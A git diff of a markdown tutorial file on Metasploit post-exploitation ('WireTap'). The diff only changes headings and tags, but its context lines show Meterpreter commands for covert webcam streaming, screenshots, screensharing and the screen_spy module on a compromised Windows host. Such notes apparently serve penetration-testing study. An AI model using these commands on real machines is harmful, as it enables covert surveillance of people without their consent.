@@ -1,6 +1,6 @@
 # 05 - WireTap
 
-Search Tag: #metasploit-framework #command-and-control
+Search Tag(s): #metasploit-framework #command-and-control
 
 ## 5.1 - Webcam
 
@@ -24,7 +24,7 @@ meterpreter > webcam_stream -h
 
 ## 5.2 - Screenshots
 
-1. **Screenshot**
+1. Screenshot
  
 ```
 meterpreter > screenshot -h
@@ -42,7 +42,7 @@ OPTIONS:
 meterpreter > screenshot -p /home/user/pic.jpeg -q 100
 ```
 
-2. **Screenshare**
+2. Screenshare
 
 ```
 meterpreter > screenshare -h
@@ -65,7 +65,7 @@ meterpreter > screenshare
 [*] Streaming...
 ```
 
-3. **`screen_spy` post exploitation module**
+3. `screen_spy` post exploitation module
 
 ```
 msf exploit(multi/handler) > use post/windows/gather/screen_spy
